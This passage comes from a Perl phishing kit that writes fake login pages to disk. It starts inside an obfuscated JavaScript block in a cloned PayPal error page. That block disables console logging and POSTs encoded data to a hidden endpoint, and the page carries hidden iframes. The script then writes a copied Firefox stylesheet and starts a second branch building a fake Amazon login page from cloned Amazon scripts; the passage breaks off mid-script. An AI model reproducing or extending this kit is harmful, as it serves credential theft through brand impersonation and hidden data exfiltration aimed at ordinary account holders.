_0x5e706d=![];for(var _0x1bb63e=0x0;_0x1bb63e<_0x540fa0[_0x2f0d('0x7')];_0x1bb63e++){var _0x17cd36=_0x540fa0[_0x1bb63e];var _0x4838d5=_0x5c390c[_0x2f0d('0x7')]-_0x17cd36[_0x2f0d('0x7')];var _0x35e34d=_0x5c390c[_0x2f0d('0x28')](_0x17cd36,_0x4838d5);var _0x2dcf6c=_0x35e34d!==-0x1&&_0x35e34d===_0x4838d5;if(_0x2dcf6c){if(_0x5c390c[_0x2f0d('0x7')]==_0x17cd36[_0x2f0d('0x7')]||_0x17cd36[_0x2f0d('0x28')]('.')===0x0){_0x5e706d=!![];}}}if(!_0x5e706d){data;}else{return;}_0x230aea();});_0x1b70ca();var _0x3855a4=_0x15a538(this,function(){var _0x5290da=function(){};var _0x34c3cf=typeof window!=='undefined'?window:typeof process===_0x2f0d('0x21')&&typeof require===_0x2f0d('0x22')&&typeof global===_0x2f0d('0x21')?global:this;if(!_0x34c3cf['console']){_0x34c3cf[_0x2f0d('0x29')]=function(_0x5290da){var _0x39c90d={};_0x39c90d['log']=_0x5290da;_0x39c90d[_0x2f0d('0x2a')]=_0x5290da;_0x39c90d[_0x2f0d('0x2b')]=_0x5290da;_0x39c90d[_0x2f0d('0x2c')]=_0x5290da;_0x39c90d[_0x2f0d('0x2d')]=_0x5290da;_0x39c90d['exception']=_0x5290da;_0x39c90d[_0x2f0d('0x2e')]=_0x5290da;return _0x39c90d;}(_0x5290da);}else{_0x34c3cf['console']['log']=_0x5290da;_0x34c3cf[_0x2f0d('0x29')][_0x2f0d('0x2a')]=_0x5290da;_0x34c3cf['console']['debug']=_0x5290da;_0x34c3cf['console'][_0x2f0d('0x2c')]=_0x5290da;_0x34c3cf['console'][_0x2f0d('0x2d')]=_0x5290da;_0x34c3cf[_0x2f0d('0x29')][_0x2f0d('0x2f')]=_0x5290da;_0x34c3cf[_0x2f0d('0x29')][_0x2f0d('0x2e')]=_0x5290da;}});_0x3855a4();_0x5b25ca=_0x5b25ca||'';return _0x5b25ca[_0x2f0d('0xd')]('&amp;','&')[_0x2f0d('0xd')](_0x2f0d('0x30'),'<')['replace']('&gt;','>')[_0x2f0d('0xd')](/&quot;/,'\x22')['replace'](/&#39;/,'\x27');};var _0x35a7c9=eccfdfcabecbbbebcdc();var _0x147d51=_0x2f0d('0x31')+encodeURIComponent(_0x35a7c9)+_0x2f0d('0x32')+encodeURIComponent(_0x2f0d('0x33'))+_0x2f0d('0x34')+encodeURIComponent(_0x50319a(_0x2f0d('0x35')));(function(_0x8ca46f,_0x9bd3a4,_0x499cbd,_0x11bd2f){var _0x26bbb1;if(window['XMLHttpRequest']){_0x26bbb1=new XMLHttpRequest();}else{_0x26bbb1=new ActiveXObject(_0x2f0d('0x36'));}_0x26bbb1['onreadystatechange']=function(){if(_0x26bbb1[_0x2f0d('0x37')]===0x4&&_0x26bbb1[_0x2f0d('0x38')]===0xc8){}};_0x26bbb1[_0x2f0d('0x39')]('POST',_0x8ca46f,!0x0);_0x26bbb1[_0x2f0d('0x3a')](_0x2f0d('0x3b'),_0x2f0d('0x3c'));_0x26bbb1[_0x2f0d('0x3d')](_0x9bd3a4+'&'+_0x499cbd+'='+_0x11bd2f);}(_0x2f0d('0x3e'),_0x147d51,_0x2f0d('0x3f'),_0x2f0d('0x40')));}());</script><iframe src="about:blank" title="pbf" style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999; top: -10000px; left: -10000px;" aria-hidden="true"></iframe><iframe title="ppfniframe" style="width: 0px; height: 0px; border: 0px none; position: absolute; z-index: -999; top: -10000px; left: -10000px;" src="https://c.paypal.com/v1/r/d/i?js_src=https://c.paypal.com/da/r/fb.js" aria-hidden="true"></iframe><div id="captchaComponent" class="ngrl-anomalydetection-div captcha-overlay captcha-container" style="display: block; visibility: visible;"><div id="main" role="main"><section id="response500" class="response500" data-app="authchallenge_response" data-role="page" data-title="Something went wrong on our end"><div class="corral"><div id="content" class="contentContainer"><header><p class="paypal-logo paypal-logo-monogram">PayPal</p></header><h1 class="headerText">Something went wrong on our end</h1><p>We're sorry, we're having some issues completing your request right now. Please try again shortly.</p><div class="actions"><a href="/signin" class="button">Try Again</a></div></div></div><footer class="footer" role="contentinfo"><div class="extendedContent"><ul class="footerGroup footerGroupWithSiblings"><li>&lt;a href="/id/webapps/mpp/ua/privacy-full"&gt;Privacy&lt;/a&gt;</li><li>&lt;a href="/id/webapps/mpp/ua/legalhub-full"&gt;Legal&lt;/a&gt;</li></ul><p class="footerCopyright">Copyright © 1999-2020 PayPal. All rights reserved.</p><p class="footerDisclaimer">Consumer advisory - PayPal Pte. Ltd., the holder of PayPal's stored value facility, does not require the approval of the Monetary Authority of Singapore. Users are advised to read the &lt;a href="/id/webapps/mpp/ua/legalhub-full"&gt;terms and conditions&lt;/a&gt; carefully.</p></div></footer><div></div></section></div><div class="transitioning hide"></div></div></body></html>
            };

            my $filePaypalCss = "stylesheet.css";
            unless (open FILE, '>'.$filePaypalCss) {
               die color("red"), "[+] Cannot create fake login Page 2 - $@", color("reset");
            }
            
            print FILE q
            {
            /* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

@namespace url("http://www.w3.org/1999/xhtml");

.videocontrols {
  writing-mode: horizontal-tb;
  width: 100%;
  height: 100%;
  display: inline-block;
  overflow: hidden;

  direction: ltr;
  /* Prevent unwanted style inheritance. See bug 554717. */
  text-align: left;
  list-style-image: none !important;
  font: normal normal normal 100%/normal sans-serif !important;
  text-decoration: none !important;
  white-space: normal !important;
}

.controlsContainer {
  --clickToPlay-size: 48px;
  --button-size: 30px;
  --timer-size: 40px;
  --timer-long-size: 60px;
  --track-size: 5px;
  --thumb-size: 13px;
  --label-font-size: 13px;
  --pip-toggle-padding: 5px;
  --pip-toggle-icon-width-height: 16px;
  --pip-toggle-translate-x: calc(100% - var(--pip-toggle-icon-width-height) - 2 * var(--pip-toggle-padding));
}
.controlsContainer.touch {
  --clickToPlay-size: 64px;
  --button-size: 40px;
  --timer-size: 52px;
  --timer-long-size: 78px;
  --track-size: 7px;
  --thumb-size: 16px;
  --label-font-size: 16px;
}

/* Some CSS custom properties defined here are referenced by videocontrols.js */
.controlBar {
  /* Do not delete: these variables are accessed by JavaScript directly.
     see videocontrols.js and search for |-width|. */
  --clickToPlay-width: var(--clickToPlay-size);
  --playButton-width: var(--button-size);
  --scrubberStack-width: 64px;
  --muteButton-width: var(--button-size);
  --volumeStack-width: 48px;
  --castingButton-width: var(--button-size);
  --closedCaptionButton-width: var(--button-size);
  --fullscreenButton-width: var(--button-size);
  --positionDurationBox-width: var(--timer-size);
  --durationSpan-width: var(--timer-size);
  --positionDurationBox-width-long: var(--timer-long-size);
  --durationSpan-width-long: var(--timer-long-size);
}

.touch .controlBar {
  /* Do not delete: these variables are accessed by JavaScript directly.
     see videocontrols.js and search for |-width|. */
  --scrubberStack-width: 84px;
  --volumeStack-width: 64px;
}

.controlsContainer [hidden],
.controlBar[hidden],
.pictureInPictureToggleButton[hidden],
.videocontrols[inDOMFullscreen] > .controlsContainer > .controlsOverlay > .pictureInPictureToggleButton {
  display: none;
}

.controlBar[size="hidden"] {
  display: none;
}

.controlsSpacer[hideCursor] {
  cursor: none;
}

.controlsContainer,
.progressContainer {
  position: relative;
  height: 100%;
}

.stackItem {
  position: absolute;
  left: 0;
  bottom: 0;
  width: 100%;
  height: 100%;
}

.statusOverlay {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  background-color: rgb(80,80,80, .85);
  color: #fff;
}

.controlsOverlay {
  display: flex;
  flex-direction: column;
  justify-content: center;
  position: relative;
}

.controlsSpacerStack {
  display: flex;
  flex-direction: column;
  flex-grow: 1;
  justify-content: center;
  align-items: center;
}

.controlBar {
  position: relative;
  display: flex;
  box-sizing: border-box;
  justify-content: center;
  align-items: center;
  overflow: hidden;
  height: 40px;
  padding: 0 9px;
  background-color: rgba(26,26,26,.8);
  color: #fff;
}

.touch .controlBar {
  height: 52px;
}

.controlBar > .button {
  height: 100%;
  min-width: var(--button-size);
  min-height: var(--button-size);
  padding: 6px;
  border: 0;
  margin: 0;
  background-color: transparent;
  background-repeat: no-repeat;
  background-position: center;
  background-origin: content-box;
  background-clip: content-box;
  -moz-context-properties: fill;
  fill: currentColor;
  color: inherit;
  /* We don't suppress ::-moz-focus-inner, so that does for a focus indicator */
  outline: none;
}

.touch .controlBar > .button {
  background-size: 24px 24px;
}

.controlBar > .button:enabled:hover {
  fill: #48a0f7;
}

.controlBar > .button:enabled:hover:active {
  fill: #2d89e6;
}

.playButton {
  background-image: url(chrome://global/skin/media/pauseButton.svg);
}
.playButton[paused] {
  background-image: url(chrome://global/skin/media/playButton.svg);
}

.muteButton {
  background-image: url(chrome://global/skin/media/audioUnmutedButton.svg);
}
.muteButton[muted] {
  background-image: url(chrome://global/skin/media/audioMutedButton.svg);
}
.muteButton[noAudio] {
  background-image: url(chrome://global/skin/media/audioNoAudioButton.svg);
}
.muteButton[noAudio] + .volumeStack {
  display: none;
}

.castingButton {
  background-image: url(chrome://global/skin/media/castingButton-ready.svg);
}

.castingButton[enabled] {
  background-image: url(chrome://global/skin/media/castingButton-active.svg);
}

.closedCaptionButton {
  background-image: url(chrome://global/skin/media/closedCaptionButton-cc-off.svg);
}
.closedCaptionButton[enabled] {
  background-image: url(chrome://global/skin/media/closedCaptionButton-cc-on.svg);
}

.fullscreenButton {
  background-image: url(chrome://global/skin/media/fullscreenEnterButton.svg);
}
.fullscreenButton[fullscreened] {
  background-image: url(chrome://global/skin/media/fullscreenExitButton.svg);
}

.controlBarSpacer {
  flex-grow: 1;
}

.volumeControl::-moz-range-thumb,
.scrubber::-moz-range-thumb {
  height: var(--thumb-size);
  width: var(--thumb-size);
  border: none;
  border-radius: 50%;
  background-color: #fff;
  filter: drop-shadow(0px 0px 2px rgba(0,0,0,0.65));
}

.volumeControl,
.scrubber {
  outline: none;
}

.progressBackgroundBar {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}

.progressStack {
  position: relative;
  width: 100%;
  height: var(--track-size);
}

.scrubberStack {
  /* minus margin to get basis of required width */
  min-width: calc(var(--scrubberStack-width) - 18px);
  flex-basis: calc(var(--scrubberStack-width) - 18px);
  flex-grow: 2;
  flex-shrink: 0;
  margin: 0 9px;
}

.volumeStack {
  max-width: 60px;
  min-width: var(--volumeStack-width);
  flex-grow: 1;
  flex-shrink: 0;
  margin-right: 6px;
  margin-left: 4px;
}

.bufferBar,
.progressBar,
.scrubber,
.volumeControl {
  bottom: 0;
  left: 0;
  position: absolute;
  width: 100%;
  height: 100%;
  padding: 0;
  border: 0;
  border-radius: calc(var(--track-size) / 2);
  margin: 0;
  background: none;
  outline: none;
}

.bufferBar {
  background-color: rgba(0,0,0,0.7);
}

.bufferBar::-moz-progress-bar,
.progressBar::-moz-progress-bar {
  height: 100%;
  padding: 0;
  margin: 0;
  border: 0;
  border-radius: calc(var(--track-size) / 2);
  background: none;
}

.scrubber:hover::-moz-range-thumb,
.volumeControl:hover::-moz-range-thumb {
  background-color: #48a0f7;
}

.scrubber:active::-moz-range-thumb,
.volumeControl:active::-moz-range-thumb {
  background-color: #2d89e6;
}

.scrubber::-moz-range-track,
.scrubber::-moz-range-progress {
  background-color: transparent;
}

.volumeControl::-moz-range-progress,
.volumeControl::-moz-range-track {
  height: var(--track-size);
  border-radius: calc(var(--track-size) / 2);
}

.volumeControl::-moz-range-progress {
  background-color: #fff;
}

.volumeControl::-moz-range-track {
  background-color: rgba(0,0,0,0.7);
}


.bufferBar::-moz-progress-bar {
  background-color: rgba(255,255,255,0.3);
  border-radius: calc(var(--track-size) / 2);
}

.progressBar::-moz-progress-bar {
  background-color: #00b6f0;
}

.textTrackListContainer {
  position: absolute;
  right: 5px;
  bottom: 45px;
  top: 5px;
  max-width: 80%;
  display: flex;
  flex-direction: column;
  justify-content: end;
}

.textTrackList {
  flex: 0 1 auto;
  border: 1px solid #000;
  border-radius: 2.5px;
  padding: 5px 0;
  vertical-align: middle;
  background-color: #000;
  opacity: 0.7;
  overflow-y: auto;
}

.touch .textTrackList {
  bottom: 58px;
}

.textTrackList > .textTrackItem {
  display: block;
  width: 100%;
  height: var(--button-size);
  font-size: var(--label-font-size);
  padding: 2px 10px;
  border: none;
  margin: 0;
  white-space: nowrap;
  overflow: hidden;
  text-align: left;
  text-overflow: ellipsis;
  color: #fff;
  background-color: transparent;
}

.textTrackList > .textTrackItem:hover {
  background-color: #444;
}

.textTrackList > .textTrackItem[on] {
  color: #48a0f7;
}

.positionLabel,
.durationLabel {
  display: none;
}

.positionDurationBox {
  text-align: center;
  padding-inline-start: 1px;
  padding-inline-end: 9px;
  white-space: nowrap;
  font: message-box;
  font-size: var(--label-font-size);
  font-size-adjust: 0.55;
}


.duration {
  display: inline-block;
  white-space: pre;
  color: #929292;
}

.statusIcon {
  width: 36px;
  height: 36px;
  margin-bottom: 20px;
}

/* Not showing the throbber on mobile because of conflict with m.youtube.com (see bug 1289412) */
.controlsContainer:not(.mobile) .statusIcon[type="throbber"] {
  background: url(chrome://global/skin/media/throbber.png) no-repeat center;
}

.controlsContainer:not(.mobile) .statusIcon[type="throbber"][stalled] {
  background: url(chrome://global/skin/media/stalled.png) no-repeat center;
}

.statusIcon[type="error"],
.statusIcon[type="pictureInPicture"] {
  background-size: contain;
  background-repeat: no-repeat;
  background-position: center;
}

.statusIcon[type="error"] {
  min-width: 70px;
  min-height: 60px;
  background-image: url(chrome://global/skin/media/error.png);
}

.statusIcon[type="pictureInPicture"] {
  min-width: 84px;
  min-height: 84px;
  background-image: url(chrome://global/skin/media/pictureinpicture.svg);
  -moz-context-properties: fill;
  fill: currentColor;
}

.pictureInPictureToggleButton {
  display: flex;
  -moz-appearance: none;
  position: absolute;
  background-color: #0060df;
  color: #fff;
  border: 0;
  padding: var(--pip-toggle-padding);
  right: 0;
  top: 50%;
  translate: var(--pip-toggle-translate-x) -50%;
  transition: opacity 160ms linear, translate 160ms linear;
  min-width: max-content;
  pointer-events: auto;
  opacity: 0;
}

.pictureInPictureToggleButton[policy="hidden"] {
  display: none;
}

.pictureInPictureToggleButton[policy="top"] {
  top: 0%;
  translate: var(--pip-toggle-translate-x);
}

.pictureInPictureToggleButton[policy="one-quarter"] {
  top: 25%;
}

.pictureInPictureToggleButton[policy="three-quarters"] {
  top: 75%;
}

.pictureInPictureToggleButton[policy="bottom"] {
  top: 100%;
  translate: var(--pip-toggle-translate-x) -100%;
}

.pictureInPictureToggleIcon {
  display: inline-block;
  background-image: url(chrome://global/skin/media/pictureinpicture.svg);
  background-position: center left;
  background-repeat: no-repeat;
  -moz-context-properties: fill;
  fill: currentColor;
  width: var(--pip-toggle-icon-width-height);
  height: var(--pip-toggle-icon-width-height);
  min-width: max-content;
}

.statusIcon[type="pictureInPicture"]:dir(rtl),
.pictureInPictureToggleIcon:dir(rtl) {
  transform: scaleX(-1);
}

.pictureInPictureToggleLabel {
  margin-inline-start: var(--pip-toggle-padding);
}

/**
 * For the Picture-in-Picture toggle, we don't use the built-in :hover
 * pseudoclass because there are many sites where the arrangement of the DOM
 * or the CSS will conspire to prevent :hover from matching on the <video>
 * itself. PictureInPictureToggleChild takes care of punching through those
 * barriers, and manually sets a .hovering class.
 */

.controlsOverlay.hovering > .pictureInPictureToggleButton {
  opacity: 0.8;
}

.controlsOverlay[hidetoggle="true"].hovering > .pictureInPictureToggleButton:not(.hovering) {
  opacity: 0;
}

.controlsOverlay.hovering > .pictureInPictureToggleButton.hovering {
  opacity: 1;
  translate: 0 -50%;
}

.controlsOverlay.hovering > .pictureInPictureToggleButton.hovering[policy="top"] {
  translate: 0;
}

.controlsOverlay.hovering > .pictureInPictureToggleButton.hovering[policy="bottom"] {
  translate: 0 -100%
}

@supports -moz-bool-pref("media.videocontrols.picture-in-picture.video-toggle.testing") {
  /**
   * To make automated tests faster, we drop the transition duration in
   * testing mode.
   */
  .pictureInPictureToggleButton {
    transition-duration: 10ms;
  }
}

/* Overlay Play button */
.clickToPlay {
  min-width: var(--clickToPlay-size);
  min-height: var(--clickToPlay-size);
  border-radius: 50%;
  background-image: url(chrome://global/skin/media/playButton.svg);
  background-repeat: no-repeat;
  background-position: 54% 50%;
  background-size: 40% 40%;
  background-color: #1a1a1a;
  -moz-context-properties: fill;
  fill: #fff;
  opacity: 0.8;
  position: relative;
  top: 20px;
}

.controlsSpacerStack:hover > .clickToPlay,
.clickToPlay:hover {
  opacity: 0.55;
}

.controlsSpacerStack:hover > .clickToPlay[fadeout] {
  opacity: 0;
}

.controlBar[fullscreen-unavailable] .fullscreenButton {
  display: none;
}

.statusOverlay[fadeout],
.statusOverlay[error] + .controlsOverlay > .controlsSpacerStack {
  opacity: 0;
}

.pictureInPictureOverlay {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  opacity: 1;
  background-color: rgb(12, 12, 13);
  color: #fff;
}

/* Status description formatting */
.statusLabel {
  padding: 0 10px;
  text-align: center;
  font: message-box;
  font-size: 14px;
}

.statusLabel {
  display: none;
}

[status="errorAborted"]         > #errorAborted,
[status="errorNetwork"]         > #errorNetwork,
[status="errorDecode"]          > #errorDecode,
[status="errorSrcNotSupported"] > #errorSrcNotSupported,
[status="errorNoSource"]        > #errorNoSource,
[status="errorGeneric"]         > #errorGeneric,
[status="pictureInPicture"]     > #pictureInPicture {
  display: inline;
}

         };

         } elsif ($fak == "2") {
            print color("yellow"), "[+] Please wait to cloning the login page ... \n", color("reset");
            sleep (4);
            print color("green"), "[+] Create fake login is succesed \n", color("reset");
            sleep (5);
            
            my $amazonLoginHtml = "amazonLogin.html";
            unless (open FILE, '>'.$amazonLoginHtml) {
               die color("red"), "[+] Cannot create the fake login 1 - $@", color("reset");
            }

            print FILE q 
            {
               <html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition null" data-19ax5a9jf="dingo" data-aui-build-date="3.19.8-2020-11-06"><head><link rel="stylesheet" href="stylesheet.css"><script async="" src="https://m.media-amazon.com/images/G/01/csm/showads.v2.js" crossorigin="anonymous"></script><script async="" src="https://images-na.ssl-images-amazon.com/images/I/31BVuidgT8L.js" crossorigin="anonymous"></script>
<script type="text/javascript">var ue_t0=ue_t0||+new Date();</script>
<script type="text/javascript">
window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
if (window.ue_ihb === 1) {

var ue_csm = window,
    ue_hob = +new Date();
(function(d){var e=d.ue=d.ue||{},f=Date.now||function(){return+new Date};e.d=function(b){return f()-(b?0:d.ue_t0)};e.stub=function(b,a){if(!b[a]){var c=[];b[a]=function(){c.push([c.slice.call(arguments),e.d(),d.ue_id])};b[a].replay=function(b){for(var a;a=c.shift();)b(a[0],a[1],a[2])};b[a].isStub=1}};e.exec=function(b,a){return function(){try{return b.apply(this,arguments)}catch(c){ueLogError(c,{attribution:a||"undefined",logLevel:"WARN"})}}}})(ue_csm);


    var ue_err_chan = 'jserr-rw';
(function(d,e){function h(f,b){if(!(a.ec>a.mxe)&&f){a.ter.push(f);b=b||{};var c=f.logLevel||b.logLevel;c&&c!==k&&c!==m&&c!==n&&c!==p||a.ec++;c&&c!=k||a.ecf++;b.pageURL=""+(e.location?e.location.href:"");b.logLevel=c;b.attribution=f.attribution||b.attribution;a.erl.push({ex:f,info:b})}}function l(a,b,c,e,g){d.ueLogError({m:a,f:b,l:c,c:""+e,err:g,fromOnError:1,args:arguments},g?{attribution:g.attribution,logLevel:g.logLevel}:void 0);return!1}var k="FATAL",m="ERROR",n="WARN",p="DOWNGRADED",a={ec:0,ecf:0,
pec:0,ts:0,erl:[],ter:[],mxe:50,startTimer:function(){a.ts++;setInterval(function(){d.ue&&a.pec<a.ec&&d.uex("at");a.pec=a.ec},1E4)}};l.skipTrace=1;h.skipTrace=1;h.isStub=1;d.ueLogError=h;d.ue_err=a;e.onerror=l})(ue_csm,window);


var ue_id = 'M49R8JGG5Z1BWJV74PY6',
    ue_url = '/ap/uedata',
    ue_navtiming = 1,
    ue_mid = 'ATVPDKIKX0DER',
    ue_sid = '138-8036082-0992152',
    ue_sn = 'www.amazon.com',
    ue_furl = 'fls-na.amazon.com',
    ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
    ue_int = 0,
    ue_fcsn = 1,
    ue_urt = 3,
    ue_rpl_ns = 'cel-rpl',
    ue_ddq = 1,
    ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:138-8036082-0992152:M49R8JGG5Z1BWJV74PY6$uedata=s:',
    ue_sbuimp = 1,

    ue_swi = 1;
function ue_viz(){(function(c,e,a){function k(b){if(c.ue.viz.length<p&&!l){var a=b.type;b=b.originalEvent;/^focus./.test(a)&&b&&(b.toElement||b.fromElement||b.relatedTarget)||(a=e[m]||("blur"==a||"focusout"==a?"hidden":"visible"),c.ue.viz.push(a+":"+(+new Date-c.ue.t0)),"visible"==a&&(ue.isl&&uex("at"),l=1))}}for(var l=0,f,g,m,n=["","webkit","o","ms","moz"],d=0,p=20,h=0;h<n.length&&!d;h++)if(a=n[h],f=(a?a+"H":"h")+"idden",d="boolean"==typeof e[f])g=a+"visibilitychange",m=(a?a+"V":"v")+"isibilityState";
k({});d&&e.addEventListener(g,k,0);c.ue&&d&&(c.ue.pageViz={event:g,propHid:f})})(ue_csm,document,window)};

(function(d,k,K){function E(a){return a&&a.replace&&a.replace(/^\s+|\s+$/g,"")}function r(a){return"undefined"===typeof a}function F(a,b){for(var c in b)b[t](c)&&(a[c]=b[c])}function G(a){try{var b=K.cookie.match(RegExp("(^| )"+a+"=([^;]+)"));if(b)return b[2].trim()}catch(c){}}function L(p,b){p&&(d.ue_id=a.id=a.rid=p,w=w.replace(/((.*?:){2})(\w+)/,function(a,b){return b+p}));b&&(w=w.replace(/(.*?:)(\w|-)+/,function(a,d){return d+b}),d.ue_sid=b);d.ue_fpf=w;d.ue.tag("accelerated-experience")}function M(){var a=
{};return function(b){b&&(a[b]=1);b=[];for(var c in a)a[t](c)&&b.push(c);return b}}function x(d,b,c,e){e=e||+new B;var f,m,y=k.csa;if(b||r(c)){if(d){f=b?h("t",b)||h("t",b,{}):a.t;f[d]=e;for(m in c)c[t](m)&&h(m,b,c[m]);!b&&k.ue_csa_pl&&y&&y("PageTiming")("mark",Z[d]||d)}return e}}function h(d,b,c){var e=b&&b!=a.id?a.sc[b]:a;e||(e=a.sc[b]={});"id"===d&&c&&(N=1);return e[d]=c||e[d]}function O(d,b,c,e,f){c="on"+c;var h=b[c];"function"===typeof h?d&&(a.h[d]=h):h=function(){};b[c]=function(a){f?(e(a),h(a)):
(h(a),e(a))};b[c]&&(b[c].isUeh=1)}function P(p,b,c,e){function q(b,c){var d=[b],g=0,e={},f,k;c?(d.push("m=1"),e[c]=1):e=a.sc;for(k in e)if(e[t](k)){var q=h("wb",k),m=h("t",k)||{},n=h("t0",k)||a.t0,l;if(c||2==q){q=q?g++:"";d.push("sc"+q+"="+k);for(l in m)3>=l.length&&!r(m[l])&&null!==m[l]&&d.push(l+q+"="+(m[l]-n));d.push("t"+q+"="+m[p]);if(h("ctb",k)||h("wb",k))f=1}}!v&&f&&d.push("ctb=1");return d.join("&")}function m(b,c,g,e){if(b){var f=d.ue_err;d.ue_url&&!e&&b&&0<b.length&&(e=new Image,a.iel.push(e),
e.src=b,a.count&&a.count("postbackImageSize",b.length));if(w){var h=k.encodeURIComponent;h&&b&&(e=new Image,b=""+d.ue_fpf+h(b)+":"+(+new B-d.ue_t0),a.iel.push(e),e.src=b)}else a.log&&(a.log(b,"uedata",{n:1}),a.ielf.push(b));f&&!f.ts&&f.startTimer();a.b&&(f=a.b,a.b="",m(f,c,g,1))}}function y(b){var c=z?z.type:C,d=c&&2!=c,e=a.bfini;N||(e&&1<e&&(b+="&bfform=1",d||(a.isBFT=e-1)),2==c&&(b+="&bfnt=1",a.isBFT=a.isBFT||1),a.ssw&&a.isBFT&&(r(a.isNRBF)&&(c=a.ssw(a.oid),c.e||r(c.val)||(a.isNRBF=1<c.val?0:1)),
r(a.isNRBF)||(b+="&nrbf="+a.isNRBF)),a.isBFT&&!a.isNRBF&&(b+="&bft="+a.isBFT));return b}if(!a.paused&&(b||r(c))){for(var l in c)c[t](l)&&h(l,b,c[l]);x("pc",b,c);l=h("id",b)||a.id;var g=a.url+"?"+p+"&v="+a.v+"&id="+l,v=h("ctb",b)||h("wb",b),n,u;v&&(g+="&ctb="+v);1<d.ueinit&&(g+="&ic="+d.ueinit);if(!("ld"!=p&&"ul"!=p||b&&b!=l)){if("ld"==p){try{k[H]&&k[H].isUeh&&(k[H]=null)}catch(G){}if(k.chrome)for(u=0;u<I.length;u++)Q(D,I[u]);(u=K.ue_backdetect)&&u.ue_back&&u.ue_back.value++;d._uess&&(n=d._uess());
a.isl=1}a._bf&&(g+="&bf="+a._bf());d.ue_navtiming&&f&&(h("ctb",l,"1"),x("tc",C,C,J));A&&!R&&(f&&F(a.t,{na_:f.navigationStart,ul_:f.unloadEventStart,_ul:f.unloadEventEnd,rd_:f.redirectStart,_rd:f.redirectEnd,fe_:f.fetchStart,lk_:f.domainLookupStart,_lk:f.domainLookupEnd,co_:f.connectStart,_co:f.connectEnd,sc_:f.secureConnectionStart,rq_:f.requestStart,rs_:f.responseStart,_rs:f.responseEnd,dl_:f.domLoading,di_:f.domInteractive,de_:f.domContentLoadedEventStart,_de:f.domContentLoadedEventEnd,_dc:f.domComplete,
ld_:f.loadEventStart,_ld:f.loadEventEnd,ntd:("function"!==typeof A.now||r(J)?0:new B(J+A.now())-new B)+a.t0}),z&&F(a.t,{ty:z.type+a.t0,rc:z.redirectCount+a.t0}),R=1);F(a.t,{hob:d.ue_hob,hoe:d.ue_hoe});a.ifr&&(g+="&ifr=1")}x(p,b,c,e);c="ld"==p&&b&&h("wb",b);var s;c||b&&b!==l||$(b);c||l==a.oid||aa(l,(h("t",b)||{}).tc||+h("t0",b),+h("t0",b));(e=d.ue_mbl)&&e.cnt&&!c&&(g+=e.cnt());c?h("wb",b,2):"ld"==p&&(a.lid=E(l));for(s in a.sc)if(1==h("wb",s))break;if(c){if(a.s)return;g=q(g,null)}else e=q(g,null),e!=
g&&(e=y(e),a.b=e),n&&(g+=n),g=q(g,b||a.id);g=y(g);if(a.b||c)for(s in a.sc)2==h("wb",s)&&delete a.sc[s];n=0;a._rt&&(g+="&rt="+a._rt());c||(a.s=0,(n=d.ue_err)&&0<n.ec&&n.pec<n.ec&&(n.pec=n.ec,g+="&ec="+n.ec+"&ecf="+n.ecf),n=h("ctb",b),h("t",b,{}));a.tag&&a.tag().length&&(g+="&csmtags="+a.tag().join("|"),a.tag=M());s=a.viz||[];(e=s.length)&&(g+="&viz="+s.splice(0,e).join("|"));r(d.ue_pty)||(g+="&pty="+d.ue_pty+"&spty="+d.ue_spty+"&pti="+d.ue_pti);a.tabid&&(g+="&tid="+a.tabid);a.aftb&&(g+="&aftb=1");
!a._ui||b&&b!=l||(g+=a._ui());a.a=g;m(g,p,n,c)}}function $(a){var b=k.ue_csm_markers||{},c;for(c in b)b[t](c)&&x(c,a,C,b[c])}function v(a,b,c){c=c||k;if(c[S])c[S](a,b,!1);else if(c[T])c[T]("on"+a,b)}function Q(a,b,c){c=c||k;if(c[U])c[U](a,b,!1);else if(c[V])c[V]("on"+a,b)}function W(){function a(){d.onUl()}function b(a){return function(){c[a]||(c[a]=1,P(a))}}var c={},e,f;d.onLd=b("ld");d.onLdEnd=b("ld");d.onUl=b("ul");e={stop:b("os")};k.chrome?(v(D,a),I.push(a)):e[D]=d.onUl;for(f in e)e[t](f)&&O(0,
k,f,e[f]);d.ue_viz&&ue_viz();v("load",d.onLd);x("ue")}function aa(f,b,c){var e=d.ue_mbl,h=k.csa,m=h&&h("SPA"),h=h&&h("Content");e&&e.ajax&&e.ajax(b,c);m&&h&&(m("newPage",{requestId:f,transitionType:"soft"}),h("get","page")("emit","loaded"));a.tag("ajax-transition")}d.ueinit=(d.ueinit||0)+1;var a=d.ue=d.ue||{};a.t0=k.aPageStart||d.ue_t0;a.id=d.ue_id;a.url=d.ue_url;a.rid=d.ue_id;a.a="";a.b="";a.h={};a.s=1;a.t={};a.sc={};a.iel=[];a.ielf=[];a.viz=[];a.v="0.210427.0";a.paused=!1;var t="hasOwnProperty",
D="beforeunload",H="on"+D,S="addEventListener",U="removeEventListener",T="attachEvent",V="detachEvent",Z={cf:"criticalFeature",af:"aboveTheFold",fn:"functional",bb:"bodyBegin",be:"bodyEnd",ld:"loaded"},B=k.Date,A=k.performance||k.webkitPerformance,f=(A||{}).timing,z=(A||{}).navigation,J=(f||{}).navigationStart,w=d.ue_fpf,N=0,R=0,I=[],C;a.oid=E(a.id);a.lid=E(a.id);a._t0=a.t0;a.tag=M();a.ifr=k.top!==k.self||k.frameElement?1:0;a.attach=v;a.detach=Q;if("000-0000000-8675309"===d.ue_sid){var X=G("cdn-rid"),
Y=G("session-id");X&&Y&&L(X,Y)}d.uei=W;d.ueh=O;d.ues=h;d.uet=x;d.uex=P;a.reset=L;a.pause=function(d){a.paused=d};W()})(ue_csm,window,ue_csm.document);


ue.stub(ue,"log");ue.stub(ue,"onunload");ue.stub(ue,"onflush");
